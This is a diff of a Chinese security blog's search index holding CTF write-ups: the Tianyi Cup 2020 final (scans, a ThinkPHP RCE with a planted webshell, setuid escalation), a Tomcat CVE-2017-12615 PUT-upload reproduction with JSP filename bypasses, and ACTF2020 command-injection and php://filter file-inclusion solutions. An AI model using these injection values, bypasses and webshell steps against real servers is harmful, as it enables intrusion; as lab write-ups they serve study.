@@ -35,6 +35,78 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Jacobi_fly天翼杯2020WP</title>
+    <url>//Jacobi_fly.html</url>
+    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
+<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
+<a id="more"></a>
+
+
+
+<p><strong>0xDktb师傅太强了</strong></p>
+<p><strong>XZLang师傅太强了</strong></p>
+<p><strong>我是废物</strong></p>
+<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
+
+
+
+<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
+<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
+<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
+<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
+<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
+
+<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
+<p>得到flag18 </p>
+<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
+<p><code>robots.txt</code> 文件直接给flag7 </p>
+<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
+
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
+<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
+<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
+<p>flag5需要root权限， </p>
+<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
+<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
+<p>用冰蝎连接查询flag: </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
+<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
+<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
+<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
+<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
+<ul>
+<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
+</li>
+<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
+</li>
+<li><p>XZLang师傅也很NB</p>
+</li>
+<li><p><font color='red'>只有我是废物呜呜呜</font></p>
+</li>
+</ul>
+<p>​    </p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>天翼杯</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>CommonCollections1 分析</title>
     <url>//CommonCollections1.html</url>
     <content><![CDATA[<p>对<code>ysoserial</code>工具中<code>CommonCollections1</code>利用链分析，跟踪调试。</p>
@@ -278,6 +350,36 @@
         <tag>JavaWeb</tag>
         <tag>fastjson</tag>
       </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/Java_learn/Tomcat1</url>
+    <content><![CDATA[<h1 id="Tomcat-历史漏洞"><a href="#Tomcat-历史漏洞" class="headerlink" title="Tomcat 历史漏洞"></a>Tomcat 历史漏洞</h1><h2 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h2><p>适用版本：Tomcat 全版本（只要关闭了 readonly）</p>
+<p>漏洞成因：在 tomcat  conf/web.xml 中错误的配置，将 <strong>readonly</strong> 字段设置为 <strong>false</strong>， 默认是 <strong>true</strong>。</p>
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603133316778.png" alt="image-20210603133316778"></p>
+<p>导致用户可以使用 http PUT 方式上传文件</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603133447934.png" alt="image-20210603133447934"></p>
+<p>返回 201 表示上传成功，返回网页端查看</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603133531908.png" alt="image-20210603133531908"></p>
+<p>尝试上传 jsp， 失败</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603133925242.png" alt="image-20210603133925242"></p>
+<p>tomcat 对于上传的文件有检测，不能直接写 jsp，需要有一定的绕过，常见的几种绕过有：</p>
+<ol>
+<li> /1.jsp/ ， tomcat 在解析的时候会把最后的 / 去掉</li>
+<li> /1.jsp::$DATA， windows 常见绕过</li>
+<li> 。。。</li>
+</ol>
+<p>尝试 / 绕过</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603134520819.png" alt="image-20210603134520819"></p>
+<p>在 docker 中查看，确实上传成功</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603134620761.png" alt="image-20210603134620761"></p>
+<p>访问，输出了 <code>hello world</code></p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603134659200.png" alt="image-20210603134659200"></p>
+<p>将配置文件中的 readonly 改为 true </p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603135617452.png" alt="image-20210603135617452"></p>
+<p>上传失败</p>
+<p><img src="https://gitee.com/ethustdout/pic2/raw/master/uPic/image-20210603135525800.png" alt="image-20210603135525800"></p>
+]]></content>
   </entry>
   <entry>
     <title>URLDNS 分析</title>
@@ -569,78 +671,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Jacobi_fly天翼杯2020WP</title>
-    <url>//Jacobi_fly.html</url>
-    <content><![CDATA[<p>2020年天翼杯决赛wp by <strong><code>Jacobi_fly</code></strong></p>
-<p><strong>Ps: 队友懒得上博客，让我来做，所以有幸给出我们做题的WP</strong></p>
-<a id="more"></a>
-
-
-
-<p><strong>0xDktb师傅太强了</strong></p>
-<p><strong>XZLang师傅太强了</strong></p>
-<p><strong>我是废物</strong></p>
-<img src="天翼杯2020/image-20200817214034533.png" alt="image-20200817214034533" style="zoom:50%;" />
-
-
-
-<p>下面差不多是按照过程整理出来的WP（大概），欢迎各位师傅交流（别骂我呜呜呜）</p>
-<h3 id="Screenshot"><a href="#Screenshot" class="headerlink" title="Screenshot"></a>Screenshot</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/mWBlpZkSeqI2hof5.jpg!thumbnail.png" alt="img"></p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ulFQZBQ7SbvCE8Bs.jpg!thumbnail.png" alt="img"></p>
-<h3 id="flag23"><a href="#flag23" class="headerlink" title="flag23"></a>flag23</h3><p>APK 解压之后，使用**<code>字符串搜索</code>**得到flag，和域名<a href="http://ps.dasctf.wetolink.com/">http://ps.dasctf.wetolink.com</a> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/1qsdwRHrNAwAAAgw.png!thumbnail.png" alt="图片"></p>
-<p>ping一下得到ip地址 (也可以直接nmap扫自己的ip/24)</p>
-<h3 id="Nmap-report"><a href="#Nmap-report" class="headerlink" title="Nmap report"></a>Nmap report</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Nmap scan report for 192.168.12.1 </span><br><span class="line">Host is up (0.10s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE    VERSION </span><br><span class="line">22/tcp   open     ssh        Huawei VRP sshd (protocol 1.99) </span><br><span class="line">23/tcp   filtered telnet </span><br><span class="line">80/tcp   open     http       Huawei S5700-series switch httpd </span><br><span class="line">443/tcp  open     ssl/https? </span><br><span class="line">1045/tcp filtered fpitp </span><br><span class="line">Service Info: OS: VRP; Device: switch; CPE: cpe:/o:huawei:vrp </span><br><span class="line">Nmap scan report for 192.168.12.251 </span><br><span class="line">Host is up (0.15s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line"> </span><br><span class="line">Nmap scan report for 192.168.12.252 </span><br><span class="line">Host is up (0.092s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br><span class="line">Nmap scan report for ps.dasctf.wetolink.com (192.168.12.253) </span><br><span class="line">Host is up (0.081s latency). </span><br><span class="line">Not shown: 995 closed ports </span><br><span class="line">PORT     STATE    SERVICE VERSION </span><br><span class="line">22/tcp   filtered ssh </span><br><span class="line">53/tcp   open     domain  dnsmasq 2.48 </span><br><span class="line">80/tcp   open     http    nginx </span><br><span class="line">3306/tcp filtered mysql </span><br><span class="line">8888/tcp open     http    nginx </span><br></pre></td></tr></table></figure>
-
-<h3 id="flag17"><a href="#flag17" class="headerlink" title="flag17"></a>flag17</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/oASq6jCeYwtsQUIF.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag18"><a href="#flag18" class="headerlink" title="flag18"></a>flag18</h3><p>查看<code>robots.txt</code> ，里面有一个链接，进入之后看到是</p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/3EwJGFPP1VmIO2lu.png!thumbnail.png" alt="图片"></p>
-<p>得到flag18 </p>
-<h3 id="flag9"><a href="#flag9" class="headerlink" title="flag9"></a>flag9</h3><p>80端口登录失败给flag9 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/maRrU72gyrotFALt.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag7"><a href="#flag7" class="headerlink" title="flag7"></a>flag7</h3><p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/hKzubHKKLzdN8jYu.png!thumbnail.png" alt="图片"></p>
-<p><code>robots.txt</code> 文件直接给flag7 </p>
-<h3 id="192-168-12-253-8888目录扫描结果"><a href="#192-168-12-253-8888目录扫描结果" class="headerlink" title="192.168.12.253:8888目录扫描结果"></a>192.168.12.253:8888目录扫描结果</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[10:48:31] Starting: </span><br><span class="line">[10:48:35] 200 -    6KB - /.DS_Store </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login </span><br><span class="line">[10:49:12] 200 -    5KB - /admin/login.html </span><br><span class="line">[10:49:12] 200 -    5KB - /Admin/login / </span><br><span class="line">[10:50:02] 200 -    0B  - /backup/ </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin </span><br><span class="line">[10:50:19] 200 -    2KB - /article/admin/admin.asp </span><br><span class="line">[10:51:05] 200 -   18KB - /Index </span><br><span class="line">[10:51:05] 200 -   18KB - /index </span><br><span class="line">[10:51:06] 200 -   18KB - /index.html </span><br><span class="line">[10:51:06] 200 -   18KB - /index.php </span><br><span class="line">[10:51:06] 200 -    7KB - /index.php/login/ </span><br><span class="line">[10:51:24] 200 -    7KB - /login </span><br><span class="line">[10:51:24] 200 -    7KB - /Login </span><br><span class="line">[10:51:25] 200 -    7KB - /login.html </span><br><span class="line">[10:51:25] 200 -    7KB - /Login.html </span><br><span class="line">[10:51:26] 200 -    7KB - /login/ </span><br><span class="line">[10:51:26] 200 -    7KB - /login/admin/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/admin/admin.asp </span><br><span class="line">[10:51:27] 200 -    7KB - /login/administrator/ </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel.%2A </span><br><span class="line">[10:51:27] 200 -    7KB - /login/cpanel/ </span><br><span class="line">[10:51:45] 200 -    7KB - /login/index </span><br><span class="line">[10:51:45] 200 -    7KB - /login/login </span><br><span class="line">[10:51:45] 200 -    7KB - /login/oauth/ </span><br><span class="line">[10:51:46] 200 -    7KB - /login/super </span><br><span class="line">[10:52:07] 200 -    3KB - /README.md </span><br><span class="line">[10:52:09] 200 -  130B  - /robots.txt </span><br><span class="line">[10:52:31] 200 -   24KB - /register </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/autoload.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_files.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_classmap.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_namespaces.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_psr4.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_real.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/autoload_static.php </span><br><span class="line">[10:52:41] 200 -    0B  - /vendor/composer/ClassLoader.php </span><br><span class="line">[10:52:41] 200 -   23KB - /vendor/composer/installed.json </span><br><span class="line">[10:52:41] 200 -    1KB - /vendor/composer/LICENSE </span><br></pre></td></tr></table></figure>
-
-<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>是一个<code>thinkphp</code>，经过测试得到版本是<code>5.0.14</code>使用kali的<code>seachsploit</code>，找到一个payload </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/S7N4aR0VTvVh7rZp.png!thumbnail.png" alt="图片"></p>
-<p>s参数是一个RCE，写入一句话木马，使用蚁剑连接，得到后门 </p>
-<h3 id="flag1-amp-amp-flag5"><a href="#flag1-amp-amp-flag5" class="headerlink" title="flag1 &amp;&amp; flag5"></a>flag1 &amp;&amp; flag5</h3><p>在<code>/home</code>目录下发现flag1和flag5，其中flag1可以直接读 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/kf3ZiTKPfXAnEbIG.png!thumbnail.png" alt="图片"></p>
-<p>flag5需要root权限， </p>
-<p>找一下<code>setuid</code>的东西，找到一个<code>nl</code> </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/XxkZNxARcAaQfu9Z.png!thumbnail.png" alt="图片"></p>
-<h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>查看<code>/var/www/html/application/database.php</code>，数据库配置的是内网的一台主机。 </p>
-<p>用冰蝎连接查询flag: </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/u9enAOu1xXM94wGP.png!thumbnail.png" alt="图片"></p>
-<p>或者查看<code>/proc/net/arp</code>也可以发现内网的主机。 </p>
-<h3 id="flag19"><a href="#flag19" class="headerlink" title="flag19"></a>flag19</h3><p>在80端口使用CBC字节翻转攻击的时候，解码<code>cookie</code>时发现。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/stkRZawsSKCozytq.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="flag22"><a href="#flag22" class="headerlink" title="flag22"></a>flag22</h3><p>登录完之后，上传 <code>test.avi</code> 然后下载，之后拿到 .avi 播放，获得 flag。 </p>
-<p><img src="%E5%A4%A9%E7%BF%BC%E6%9D%AF2020/ovsCwUxRD94gsU4e.jpg!thumbnail.png" alt="图片"></p>
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>是Jacobi_fly队伍的出道战役（以前不叫这名</p>
-<p>也是我们目前取得的最好的成绩，这里特别感谢我的队友们</p>
-<ul>
-<li><p>初赛由淘宝师傅一人carry，带着一道题没做出来的我和做了签到题的XZLang进入复赛</p>
-</li>
-<li><p>这次淘宝师傅又carry了，大多数flag都是由他交上，一人狂砍1000+分（x</p>
-</li>
-<li><p>XZLang师傅也很NB</p>
-</li>
-<li><p><font color='red'>只有我是废物呜呜呜</font></p>
-</li>
-</ul>
-<p>​    </p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-        <category>天翼杯</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>windows kerberos协议</title>
     <url>//windows_kerberos.html</url>
     <content><![CDATA[<p>Windows下<code>kerberos</code>协议的相关认知</p>
@@ -850,6 +880,51 @@
       </tags>
   </entry>
   <entry>
+    <title>ACTF2020</title>
+    <url>//buu_ACTF2020.html</url>
+    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
+<a id="more"></a>
+
+<h1 id="ACTF-2020-Exec"><a href="#ACTF-2020-Exec" class="headerlink" title="ACTF-2020-Exec"></a>ACTF-2020-Exec</h1><p>点进靶机界面如下</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
+
+<p>结合题目名，猜测是命令执行</p>
+<p>输入<code>l | ls</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
+
+<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
+
+<p>使用<code>cat</code>命令读取</p>
+<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
+
+
+
+<h1 id="ACTF-2020-Include"><a href="#ACTF-2020-Include" class="headerlink" title="ACTF-2020-Include"></a>ACTF-2020-Include</h1><h2 id="Index-php"><a href="#Index-php" class="headerlink" title="Index.php"></a>Index.php</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure>
+
+<p>结合题目名可以猜测是一个文件包含</p>
+<p>使用<code>php伪协议</code>读一下源码</p>
+<p><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
+<p>解码之后是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;meta charset&#x3D;&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php:&#x2F;&#x2F;input&quot;) || stristr($file,&quot;zip:&#x2F;&#x2F;&quot;) || stristr($file,&quot;phar:&#x2F;&#x2F;&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#39;hacker!&#39;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#39;&lt;a href&#x3D;&quot;?file&#x3D;flag.php&quot;&gt;tips&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>通过这个文件包含读一下<code>flag.php</code>的源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;Can you find out the flag?&quot;;</span><br><span class="line">&#x2F;&#x2F;flag&#123;bfb0b1cd-426b-4590-9b3d-059c3b3cec96&#125;</span><br></pre></td></tr></table></figure>
+
+<p>得到了flag</p>
+]]></content>
+      <categories>
+        <category>web</category>
+        <category>buu</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>buu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GXYCTF2019_Ping Ping Ping</title>
     <url>//buu_GXYCTF2019_Ping_Ping_Ping.html</url>
     <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
@@ -889,51 +964,6 @@
 <p>执行之后在注释里面看到<code>flag</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?ip&#x3D;</span><br><span class="line">&lt;pre&gt;PING l (127.0.0.1): 56 data bytes</span><br><span class="line">&lt;?php</span><br><span class="line">$flag &#x3D; &quot;flag&#123;3158ae61-1e44-495d-9f83-f63a7c25fd14&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>web</category>
-        <category>buu</category>
-      </categories>
-      <tags>
-        <tag>web</tag>
-        <tag>buu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ACTF2020</title>
-    <url>//buu_ACTF2020.html</url>
-    <content><![CDATA[<p><a href="%5Bhttps://buuoj.cn/challenges">buuoj</a></p>
-<a id="more"></a>
-
-<h1 id="ACTF-2020-Exec"><a href="#ACTF-2020-Exec" class="headerlink" title="ACTF-2020-Exec"></a>ACTF-2020-Exec</h1><p>点进靶机界面如下</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213540334.png" alt="image-20200809213540334" style="zoom:50%;" />
-
-<p>结合题目名，猜测是命令执行</p>
-<p>输入<code>l | ls</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213614575.png" alt="image-20200809213614575" style="zoom:50%;" />
-
-<p>确实是这样，一步一步查找，在根目录下找到了<code>flag</code></p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213701427.png" alt="image-20200809213701427" style="zoom:50%;" />
-
-<p>使用<code>cat</code>命令读取</p>
-<img src="[ACTF2020 新生赛]Exec/image-20200809213717018.png" alt="image-20200809213717018" style="zoom:50%;" />
-
-
-
